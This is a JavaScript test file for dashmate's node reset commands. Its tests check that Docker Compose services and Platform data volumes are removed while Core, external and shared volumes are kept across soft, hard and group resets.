      useConfigs([mainnetConfig]);

      writeFile('mainnet', 'core', 'dash.conf');
      writeFile('mainnet', 'platform', 'gateway', 'ssl', 'private.key');
    });

    it('should let a hard Platform reset clear its Platform data', async () => {
      await hardReset({ isPlatformOnlyReset: true, keepData: false });

      expect(dockerCompose.rm).to.have.been.calledOnceWithExactly(config, {
        serviceNames: ['drive_abci', 'dashmate_helper'],
        profiles: ['platform'],
        removeVolumes: true,
      });
      expect(fs.existsSync(homeDir.joinPath('mainnet', 'platform'))).to.be.false();
      expect(fs.existsSync(homeDir.joinPath('mainnet', 'core', 'dash.conf'))).to.be.true();
      expect(config.get('platform')).to.deep.equal(getMainnetConfig().get('platform'));
    });

    // Platform services are named whether the config enables them or not, so
    // a soft reset can clear the old Platform data too. The local group's seed
    // node has Platform disabled, and refusing there failed `group reset
    // --platform` after the other members were already reset.
    it('should reset Platform services and data without --hard too', async () => {
      const platformOptions = config.get('platform');

      await reset({ isPlatformOnlyReset: true, keepData: false });

      expect(dockerCompose.rm).to.have.been.calledOnce();
      expect(dockerCompose.getVolumeCandidates).to.have.been.calledOnce();
      expect(config.get('platform')).to.deep.equal(platformOptions);
      expect(fs.existsSync(homeDir.joinPath('mainnet', 'platform', 'gateway', 'ssl', 'private.key'))).to.be.true();
    });
  });

  // Run against the real Compose model and DockerCompose, with only the
  // `docker compose` process replaced by a stand-in that answers as Compose
  // does: a `--profile` selection that leaves out Core makes the quorum list's
  // dependency on Core invalid, and so does a service an override adds that
  // depends on a service whose profile is not enabled. A service named
  // explicitly brings the services it depends on into the model, a service
  // whose profile is not enabled is left out of it, and so is a volume key no
  // service in it mounts. `--profile '*'` enables every profile, and without
  // any `--profile` the config's own profiles are enabled.
  describe('Compose commands of a Platform reset', () => {
    const ALL_PROFILES = ['core', 'platform', 'platform-quorum'];

    const PLATFORM_SERVICES = [
      'drive_abci',
      'drive_tenderdash',
      'rs_dapi',
      'gateway',
      'quorum_list',
      'gateway_rate_limiter',
      'gateway_rate_limiter_redis',
      'gateway_rate_limiter_metrics',
    ];

    const SERVICE_VOLUMES = {
      core: [{ type: 'volume', source: 'core_data', target: '/home/dash' }],
      drive_abci: [{ type: 'volume', source: 'drive_abci_data', target: '/var/lib/dash/rs-drive-abci/db' }],
      drive_tenderdash: [
        { type: 'volume', source: 'drive_tenderdash', target: '/tenderdash' },
        { type: 'bind', source: '/home/user/.dashmate/testnet/platform/drive/tenderdash', target: '/tenderdash/config' },
      ],
      rs_dapi: [{ type: 'volume', source: 'rs-dapi-access-logs', target: '/var/log/rs-dapi' }],
    };

    let composeCalls;
    let serviceVolumes;
    let overrideServices;
    let volumeDefinitions;
    let dockerVolumeLabels;
    let removedVolumes;
    let runningContainers;
    let configFailure;
    let configFailureConfigName;
    let volumeDefinitionsByConfig;
    let volumeInspectErrors;
    let onRemoveServices;
    let platformConfig;
    let projectName;
    let diContainer;

    /**
     * Name the volumes as Compose does and label them as Docker does for the
     * ones Compose created for the project: with the project and the key
     */
    function createProjectVolumes() {
      volumeDefinitions = {};
      dockerVolumeLabels = {};
      Object.values(serviceVolumes).flat()
        .filter(({ type }) => type === 'volume')
        .forEach(({ source }) => {
          volumeDefinitions[source] = { name: `docker_${source}` };
          dockerVolumeLabels[`docker_${source}`] = {
            'com.docker.compose.project': projectName,
            'com.docker.compose.volume': source,
          };
        });
    }

    /**
     * A Docker volume as the Docker API gives it
     *
     * @param {string} name
     * @param {function(): Promise<void>} remove
     * @return {Object}
     */
    function dockerVolume(name, remove) {
      return {
        inspect: async () => {
          if (volumeInspectErrors[name]) {
            throw volumeInspectErrors[name];
          }

          if (!dockerVolumeLabels[name]) {
            throw Object.assign(new Error(`no such volume: ${name}`), { statusCode: 404 });
          }

          return { Name: name, Labels: dockerVolumeLabels[name] };
        },
        remove,
      };
    }

    beforeEach(async function beforeEach() {
      diContainer = await createDIContainer({ DASHMATE_HOME_DIR: homeDir.getPath() });

      const diConfigFile = diContainer.resolve('createConfigFile')();
      diContainer.register({ configFile: asValue(diConfigFile) });

      platformConfig = diConfigFile.getConfig('testnet');
      platformConfig.set('platform.quorumList.enabled', true);
      platformConfig.set('platform.gateway.rateLimiter.metrics.enabled', true);

      projectName = diContainer.resolve('generateEnvs')(platformConfig).COMPOSE_PROJECT_NAME;

      serviceVolumes = structuredClone(SERVICE_VOLUMES);
      createProjectVolumes();
      // Services an override adds: their profiles, mounts and dependencies
      overrideServices = {};

      removedVolumes = [];
      runningContainers = [];
      configFailure = null;
      configFailureConfigName = null;
      volumeDefinitionsByConfig = {};
      volumeInspectErrors = {};
      onRemoveServices = () => {};
      diContainer.register({
        docker: asValue({
          getVolume: (name) => dockerVolume(name, async () => {
            removedVolumes.push(name);
          }),
        }),
      });

      this.sinon.stub(diContainer.resolve('dockerCompose'), 'throwErrorIfNotInstalled').resolves();

      composeCalls = [];
      this.sinon.stub(compose, 'execCompose').callsFake(async (command, args, options) => {
        const composeOptions = (options.composeOptions ?? []).flat();
        const commandOptions = (options.commandOptions ?? []).flat();
        composeCalls.push({
          command, args, composeOptions, commandOptions, configName: options.env?.CONFIG_NAME,
        });

        const profiles = composeOptions.filter((_, i) => composeOptions[i - 1] === '--profile');
        if (profiles.includes('platform-quorum') && !profiles.includes('core')) {
          // eslint-disable-next-line prefer-promise-reject-errors
          return Promise.reject({
            exitCode: 1,
            out: '',
            err: 'service "quorum_list" depends on undefined service "core": invalid compose project\n',
          });
        }

        const enabledProfiles = profiles.length > 0
          ? profiles
          : (options.env?.COMPOSE_PROFILES ?? '').split(',');
        const isEnabled = (serviceProfiles) => serviceProfiles.length === 0
          || enabledProfiles.includes('*')
          || serviceProfiles.some((profile) => enabledProfiles.includes(profile));
        const enabledOverrideServices = Object.entries(overrideServices)
          .filter(([, service]) => isEnabled(service.profiles));

        const brokenDependant = enabledOverrideServices.find(([, service]) => (service.dependsOn ?? [])
          .some((dependency) => PLATFORM_SERVICES.includes(dependency) && !isEnabled(['platform'])));
        if (brokenDependant) {
          // eslint-disable-next-line prefer-promise-reject-errors
          return Promise.reject({
            exitCode: 1,
            out: '',
            err: `service "${brokenDependant[0]}" depends on undefined service "${brokenDependant[1].dependsOn[0]}": invalid compose project\n`,
          });
        }

        if (command === 'ps') {
          // Compose before 2.15 fails `ps <names>` when a named service has
          // no container.
          const namedServices = commandOptions
            .filter((option, i) => !option.startsWith('-') && commandOptions[i - 1] !== '--format');
          const serviceWithoutContainer = namedServices
            .find((name) => !runningContainers.some(({ Service: service }) => service === name));

          if (serviceWithoutContainer) {
            // eslint-disable-next-line prefer-promise-reject-errors
            return Promise.reject({ exitCode: 1, out: '', err: `no such service: ${serviceWithoutContainer}\n` });
          }

          return { exitCode: 0, err: '', out: runningContainers.map((c) => JSON.stringify(c)).join('\n') };
        }

        if (command === 'config' && configFailure && (configFailureConfigName === null
          || options.env.CONFIG_NAME === configFailureConfigName)) {
          return Promise.reject(configFailure);
        }

        if (command === 'config' && commandOptions.includes('--volumes')) {
          return { exitCode: 0, err: '', out: Object.values(serviceVolumes).flat().map(({ source }) => source).join('\n') };
        }

        if (command === 'config') {
          // Given no names, Compose describes every service of the model.
          const serviceNames = args.length > 0
            ? [...args, ...(args.includes('quorum_list') ? ['core'] : [])]
            : [...PLATFORM_SERVICES, 'core', 'dashmate_helper', ...Object.keys(serviceVolumes)];
          const services = Object.fromEntries([
            ...serviceNames.map((name) => [name, { volumes: serviceVolumes[name] }]),
            ...enabledOverrideServices.map(([name, service]) => [name, { volumes: service.volumes }]),
          ]);

          const mountedKeys = new Set(Object.values(services)
            .flatMap((service) => service.volumes ?? [])
            .map(({ source }) => source));

          const volumes = Object.fromEntries(Object.entries(
            volumeDefinitionsByConfig[options.env?.CONFIG_NAME] ?? volumeDefinitions,
          ).filter(([key]) => mountedKeys.has(key)));

          return {
            exitCode: 0,
            err: '',
            out: JSON.stringify({ name: projectName, services, volumes }),
          };
        }

        if (command === 'rm') {
          onRemoveServices(options.env?.CONFIG_NAME);
        }

        return { exitCode: 0, err: '', out: '' };
      });
    });

    function platformReset(ctx) {
      return new Listr([{ task: () => diContainer.resolve('resetNodeTask')(platformConfig) }], { renderer: 'silent' })
        .run({
          isPlatformOnlyReset: true,
          isHardReset: false,
          isForce: true,
          keepData: false,
          removeConfig: false,
          ...ctx,
        });
    }

    /**
     * @param {string[]} composeOptions
     * @return {string[]}
     */
    function selectedProfiles(composeOptions) {
      return composeOptions.filter((_, i) => composeOptions[i - 1] === '--profile');
    }

    /**
     * @param {string[]} profiles - the profiles a command selects
     */
    function expectEveryProfile(profiles) {
      if (profiles.length === 1 && profiles[0] === '*') {
        return;
      }

      expect(profiles).to.have.members(ALL_PROFILES);
    }

    /**
     * @return {string[]}
     */
    function removedServices() {
      const rmCalls = composeCalls.filter(({ command }) => command === 'rm');
      expect(rmCalls).to.have.lengthOf(1);

      return rmCalls[0].args.filter((arg) => !arg.startsWith('-'));
    }

    // A profile selection that leaves out Core makes Compose fail or act on
    // the whole project, Core included. The reset names the Platform services
    // and, where it selects profiles at all, selects every one, so Core stays
    // in the model and out of the command.
    it('should name every Platform service and never select profiles without Core', async () => {
      await platformReset();

      composeCalls.forEach(({ composeOptions }) => {
        const profiles = selectedProfiles(composeOptions);

        if (profiles.length > 0) {
          expectEveryProfile(profiles);
        }
      });

      expect(removedServices()).to.have.members([...PLATFORM_SERVICES, 'dashmate_helper']);
    });

    // Some Compose versions (2.10 to 2.12) skip a named service whose profile
    // is not enabled, so the removal enables every profile next to the names.
    it('should enable every profile when it removes Platform services', async () => {
      await platformReset();

      const [rmCall] = composeCalls.filter(({ command }) => command === 'rm');
      expect(selectedProfiles(rmCall.composeOptions)).to.have.members(ALL_PROFILES);
    });

    it('should run no Compose command but the volume lookup and removal', async () => {
      await platformReset();

      expect(composeCalls.map(({ command }) => command)).to.deep.equal(['config', 'rm']);
    });

    // Anonymous volumes are data too, and go unless data is kept.
    it('should remove anonymous volumes with the containers', async () => {
      await platformReset();

      const [rmCall] = composeCalls.filter(({ command }) => command === 'rm');
      expect(rmCall.commandOptions).to.include('-v');
    });

    it('should keep every volume with --keep-data', async () => {
      await platformReset({ keepData: true });

      const [rmCall] = composeCalls.filter(({ command }) => command === 'rm');
      expect(rmCall.commandOptions).to.not.include('-v');
      expect(composeCalls.filter(({ command }) => command === 'config')).to.be.empty();
      expect(removedVolumes).to.be.empty();
    });

    // Compose acts on every service of the project when given no names.
    it('should refuse to remove anything when it finds no Platform service', async () => {
      diContainer.register({
        getServiceList: asValue(() => [{ name: 'core', profiles: ['core'] }]),
      });

      await expect(platformReset()).to.be.rejectedWith('No Platform services found');

      expect(composeCalls).to.be.empty();
    });

    // Compose brings Core into the model as the quorum list's dependency, so
    // its volume is there too, and must not be taken for a Platform one. The
    // names are the ones Compose gives the volumes.
    it('should remove the volumes of Platform services only', async () => {
      await platformReset();

      expect(removedVolumes).to.have.members([
        'docker_drive_abci_data',
        'docker_drive_tenderdash',
        'docker_rs-dapi-access-logs',
      ]);

      const [configCall] = composeCalls.filter(({ command }) => command === 'config');
      expect(selectedProfiles(configCall.composeOptions)).to.deep.equal(['*']);
    });

    // An override can add a service in a profile none of dashmate's Compose
    // files declares, and mount a Platform volume into it, under an external
    // key or under the Platform key itself. Compose leaves a service whose
    // profile is not enabled out of the model, with the keys only it mounts,
    // while Docker still labels the volume for the Platform key.
    it('should keep a volume a service in a profile only an override declares mounts too', async () => {
      overrideServices.drive_backup = {
        profiles: ['backup'],
        volumes: [
          { type: 'volume', source: 'drive_backup_data', target: '/backup/drive' },
          { type: 'volume', source: 'drive_tenderdash', target: '/backup/tenderdash' },
        ],
      };
      volumeDefinitions.drive_backup_data = { name: 'docker_drive_abci_data', external: true };

      await platformReset();

      expect(removedVolumes).to.have.members(['docker_rs-dapi-access-logs']);
    });

    // An override can mount into a Platform service a volume the operator
    // manages, or one another project created under the same explicit name.
    // Neither is this project's Platform data, and once the containers are
    // gone nothing holds them in use.
    it('should keep an external volume and another project\'s volume a Platform service mounts', async () => {
      serviceVolumes.gateway = [
        { type: 'volume', source: 'operator_logs', target: '/var/log/operator' },
        { type: 'volume', source: 'shared_cache', target: '/var/cache/shared' },
      ];
      volumeDefinitions.operator_logs = { name: 'operator_logs', external: true };
      volumeDefinitions.shared_cache = { name: 'shared_cache' };
      dockerVolumeLabels.operator_logs = {};
      dockerVolumeLabels.shared_cache = {
        'com.docker.compose.project': 'other_project',
        'com.docker.compose.volume': 'shared_cache',
      };

      await platformReset();

      expect(removedVolumes).to.have.members([
        'docker_drive_abci_data',
        'docker_drive_tenderdash',
        'docker_rs-dapi-access-logs',
      ]);
    });

    // An override can give a Platform service a volume Core mounts too, or an
    // external key for a volume a Platform key also names. Docker knows the
    // volume by its name, and it is Platform data only when Platform alone
    // uses it and nothing declares it external.
    it('should keep a volume Core mounts too, or one any key declares external', async () => {
      serviceVolumes.core = [
        ...serviceVolumes.core,
        { type: 'volume', source: 'core_shared', target: '/shared' },
      ];
      serviceVolumes.gateway = [
        { type: 'volume', source: 'core_data', target: '/core' },
        { type: 'volume', source: 'gateway_shared', target: '/shared' },
        { type: 'volume', source: 'gateway_managed', target: '/managed' },
      ];
      createProjectVolumes();
      volumeDefinitions.gateway_shared = { name: 'docker_core_shared' };
      volumeDefinitions.gateway_managed = { name: 'docker_drive_abci_data', external: true };
      // Created for the Platform key, as when Compose started the gateway first
      dockerVolumeLabels.docker_core_shared['com.docker.compose.volume'] = 'gateway_shared';

      await platformReset();

      expect(removedVolumes).to.have.members([
        'docker_drive_tenderdash',
        'docker_rs-dapi-access-logs',
      ]);
    });

    // The helper is removed with the Platform services, so a volume it shares
    // with them has no service left to use it.
    it('should remove a Platform volume the helper mounts too', async () => {
      serviceVolumes.dashmate_helper = [
        { type: 'volume', source: 'drive_abci_data', target: '/drive' },
      ];

      await platformReset();

      expect(removedVolumes).to.include('docker_drive_abci_data');
    });

    // Compose cannot describe the project while service files it needs are
    // missing. Finding that out after the removal would leave the containers
    // gone and the volumes in place.
    it('should look the volumes up before it removes anything', async () => {
      configFailure = { exitCode: 1, out: '', err: 'env file logger.env not found\n' };

      await expect(platformReset()).to.be.rejectedWith('logger.env');

      expect(composeCalls.filter(({ command }) => command === 'rm')).to.be.empty();
    });

    // A group reset removes its members one after another, so a member whose
    // project Compose cannot describe would be found only after the members
    // before it lost their Platform services. Forcing the reset skips the
    // running-services check only.
    it('should look up every member\'s volumes before it removes any member\'s services', async () => {
      const members = ['node_1', 'node_2'].map((name) => {
        const options = platformConfig.getStoredOptions();
        options.group = 'testnet';

        return new Config(name, options);
      });

      configFailure = { exitCode: 1, out: '', err: 'env file logger.env not found\n' };
      configFailureConfigName = 'node_2';

      const error = await GroupResetCommand.prototype.runWithDependencies.call(
        {},
        {},
        {
          verbose: false, hard: false, force: true, platform: true,
        },
        diContainer.resolve('resetNodeTask'),
        members,
        () => new Listr([]),
        () => new Listr([]),
      ).then(() => null, (e) => e);

      expect(error.getError().message).to.include('logger.env');
      expect(composeCalls.filter(({ command }) => command === 'rm')).to.be.empty();
    });

    // The removal goes by the plan the group's check prepared for the
    // member, rather than asking Compose again once other members are gone.
    it('should reset each member of a group by the plan its check prepared', async () => {
      const members = ['node_1', 'node_2'].map((name) => {
        const options = platformConfig.getStoredOptions();
        options.group = 'testnet';

        return new Config(name, options);
      });

      await GroupResetCommand.prototype.runWithDependencies.call(
        {},
        {},
        {
          verbose: false, hard: false, force: true, platform: true,
        },
        diContainer.resolve('resetNodeTask'),
        members,
        () => new Listr([]),
        () => new Listr([]),
      );

      const callsFor = (command) => composeCalls
        .filter((call) => call.command === command)
        .map(({ configName }) => configName);

      expect(callsFor('config')).to.have.members(['node_1', 'node_2']);
      expect(callsFor('rm')).to.deep.equal(['node_1', 'node_2']);
      expect(composeCalls.findIndex(({ command }) => command === 'rm'))
        .to.be.above(composeCalls.map(({ command }) => command).lastIndexOf('config'));
    });

    // A group reset plans every member before it resets any, and while the
    // members before it are reset a later member's volume can be replaced by
    // one Platform does not own, or created by a start. Whose a volume is
    // counts when it is removed, not when the reset was planned.
    it('should decide whose a member\'s volume is when it removes it', async () => {
      const members = ['node_1', 'node_2'].map((name) => {
        const options = platformConfig.getStoredOptions();
        options.group = 'testnet';

        return new Config(name, options);
      });

      volumeDefinitionsByConfig.node_2 = Object.fromEntries(Object.keys(volumeDefinitions)
        .map((key) => [key, { name: `node_2_${key}` }]));
      Object.keys(volumeDefinitions).forEach((key) => {
        dockerVolumeLabels[`node_2_${key}`] = {
          'com.docker.compose.project': projectName,
          'com.docker.compose.volume': key,
        };
      });
      delete dockerVolumeLabels.node_2_drive_tenderdash;

      onRemoveServices = (configName) => {
        if (configName !== 'node_1') {
          return;
        }

        dockerVolumeLabels.node_2_drive_abci_data = {
          'com.docker.compose.project': 'other_project',
          'com.docker.compose.volume': 'drive_abci_data',
        };
        dockerVolumeLabels.node_2_drive_tenderdash = {
          'com.docker.compose.project': projectName,
          'com.docker.compose.volume': 'drive_tenderdash',
        };
      };

      await GroupResetCommand.prototype.runWithDependencies.call(
        {},
        {},
        {
          verbose: false, hard: false, force: true, platform: true,
        },
        diContainer.resolve('resetNodeTask'),
        members,
        () => new Listr([]),
        () => new Listr([]),
      );

      expect(removedVolumes.filter((name) => name.startsWith('node_2_'))).to.have.members([
        'node_2_drive_tenderdash',
        'node_2_rs-dapi-access-logs',
      ]);
    });

    // Whose a volume is counts when it is removed, but a Docker that cannot
    // answer for a later member's volume must stop the group before the
    // members before it lose their services and files.
    it('should ask Docker about every member\'s volumes before it removes anything', async () => {
      const members = ['node_1', 'node_2'].map((name) => {
        const options = platformConfig.getStoredOptions();
        options.group = 'testnet';

        return new Config(name, options);
      });

      volumeDefinitionsByConfig.node_2 = { drive_abci_data: { name: 'node_2_drive_abci_data' } };
      volumeInspectErrors.node_2_drive_abci_data = Object.assign(new Error('Docker volume inspect failed'), { statusCode: 500 });

      const error = await GroupResetCommand.prototype.runWithDependencies.call(
        {},
        {},
        {
          verbose: false, hard: false, force: true, platform: true,
        },
        diContainer.resolve('resetNodeTask'),
        members,
        () => new Listr([]),
        () => new Listr([]),
      ).then(() => null, (e) => e);

      expect(error.getError().message).to.include('Docker volume inspect failed');
      expect(composeCalls.filter(({ command }) => command === 'rm')).to.be.empty();
      expect(removedVolumes).to.be.empty();
    });

    // While the reset waits for a volume in use, it can be removed and
    // replaced under the same name by a volume Platform does not own.
    it('should ask whose a volume is again before each attempt to remove it', async () => {
      let attempts = 0;
      diContainer.register({
        docker: asValue({
          getVolume: (name) => dockerVolume(name, async () => {
            if (name === 'docker_drive_abci_data') {
              attempts += 1;

              if (attempts === 1) {
                // eslint-disable-next-line no-throw-literal
                throw { statusCode: 409 };
              }
            }

            removedVolumes.push(name);
          }),
        }),
      });

      let removals = 0;
      onRemoveServices = () => {
        removals += 1;

        if (removals === 2) {
          dockerVolumeLabels.docker_drive_abci_data = {
            'com.docker.compose.project': 'other_project',
            'com.docker.compose.volume': 'drive_abci_data',
          };
        }
      };

      await platformReset();

      expect(removals).to.equal(2);
      expect(removedVolumes).to.not.include('docker_drive_abci_data');
    });

    it('should remove the Platform services again the same way while a volume is in use', async () => {
      let attempts = 0;
      diContainer.register({
        docker: asValue({
          getVolume: (name) => dockerVolume(name, async () => {
            attempts += 1;

            if (name === 'docker_drive_abci_data' && attempts === 1) {
              // eslint-disable-next-line no-throw-literal
              throw { statusCode: 409 };
            }

            removedVolumes.push(name);
          }),
        }),
      });

      await platformReset();

      const rmCalls = composeCalls.filter(({ command }) => command === 'rm');
      expect(rmCalls).to.have.lengthOf(2);
      expect(rmCalls[1].args).to.deep.equal(rmCalls[0].args);
      expect(rmCalls[1].composeOptions).to.deep.equal(rmCalls[0].composeOptions);
      expect(rmCalls[1].commandOptions).to.include('-v');
      expect(removedVolumes).to.include('docker_drive_abci_data');
    });

    // With Platform disabled every Platform service is off by profile, so
    // only naming them reaches their containers and volumes.
    it('should reach Platform services and not Core when Platform is disabled', async () => {
      platformConfig = diContainer.resolve('configFile').getConfig('mainnet');
      platformConfig.set('platform.quorumList.enabled', true);
      platformConfig.set('platform.gateway.rateLimiter.metrics.enabled', true);
      projectName = diContainer.resolve('generateEnvs')(platformConfig).COMPOSE_PROJECT_NAME;
      createProjectVolumes();

      await platformReset({ isHardReset: true });

      composeCalls.forEach(({ composeOptions }) => {
        const profiles = selectedProfiles(composeOptions);

        if (profiles.length > 0) {
          expectEveryProfile(profiles);
        }
      });

      expect(removedServices()).to.have.members([...PLATFORM_SERVICES, 'dashmate_helper']);
      expect(removedVolumes).to.have.members([
        'docker_drive_abci_data',
        'docker_drive_tenderdash',
        'docker_rs-dapi-access-logs',
      ]);
    });

    // An override can add a service with no profile that depends on a
    // Platform service. With Platform disabled, Compose refuses to load the
    // project with the config's own profiles, even to list them, so the
    // lookup loads it with every profile.
    it('should clear Platform data when Platform is disabled and an override service depends on it', async () => {
      platformConfig = diContainer.resolve('configFile').getConfig('mainnet');
      projectName = diContainer.resolve('generateEnvs')(platformConfig).COMPOSE_PROJECT_NAME;
      createProjectVolumes();
      overrideServices.drive_watcher = { profiles: [], volumes: [], dependsOn: ['drive_abci'] };

      await platformReset({ isHardReset: true });

      expect(removedVolumes).to.have.members([
        'docker_drive_abci_data',
        'docker_drive_tenderdash',
        'docker_rs-dapi-access-logs',
      ]);
    });

    /**
     * @param {string} service
     * @return {Object} a container as `docker compose ps --format json` lists it
     */
    function runningContainer(service) {
      return { Service: service, State: 'running' };
    }

    // A volume held by a container the reset does not remove stays in use
    // however often the Platform services are removed again.
    it('should give up on a volume that stays in use', async function test() {
      const clock = this.sinon.useFakeTimers();
      diContainer.register({
        docker: asValue({
          // eslint-disable-next-line prefer-promise-reject-errors
          getVolume: (name) => dockerVolume(name, () => Promise.reject({ statusCode: 409 })),
        }),
      });

      const result = platformReset().then(() => null, (e) => e);
      await clock.tickAsync(60 * 1000);
      const error = await result;

      expect(error).to.be.an('error');
      expect(error.message).to.include("'docker_drive_abci_data' is still in use");
      expect(composeCalls.filter(({ command }) => command === 'rm').length).to.be.below(40);
    });

    // Core keeps running through a Platform reset.
    it('should not count Core as a running service', async () => {
      runningContainers = [runningContainer('core'), runningContainer('dashmate_helper')];

      await platformReset({ isForce: false });

      expect(removedServices()).to.include('drive_abci');
    });

    // `docker compose ps <names>` fails before Compose 2.15 when a named
    // service has no container, which read as nothing running. A service the
    // config enables but that was never started then hid a running Core, and
    // the reset went on to take the node down.
    it('should refuse a full reset while Core runs next to a service with no container', async () => {
      runningContainers = [runningContainer('core')];

      await expect(platformReset({ isPlatformOnlyReset: false, isForce: false }))
        .to.be.rejectedWith('Running services detected');

      expect(composeCalls.filter(({ command }) => command === 'down')).to.be.empty();
    });

    // `docker compose ps <names>` fails before Compose 2.15 when a named
    // service has no container, and without every profile older versions
    // leave out the services the config does not enable.
    it('should refuse while a Platform service is running', async () => {
      runningContainers = [runningContainer('core'), runningContainer('drive_tenderdash')];

      await expect(platformReset({ isForce: false }))
        .to.be.rejectedWith('Running services detected');

      const [psCall] = composeCalls.filter(({ command }) => command === 'ps');
      expect(psCall.commandOptions).to.deep.equal(['--format', 'json']);
      expect(selectedProfiles(psCall.composeOptions)).to.have.members(ALL_PROFILES);
      expect(composeCalls.filter(({ command }) => command === 'rm')).to.be.empty();
    });
  });
});
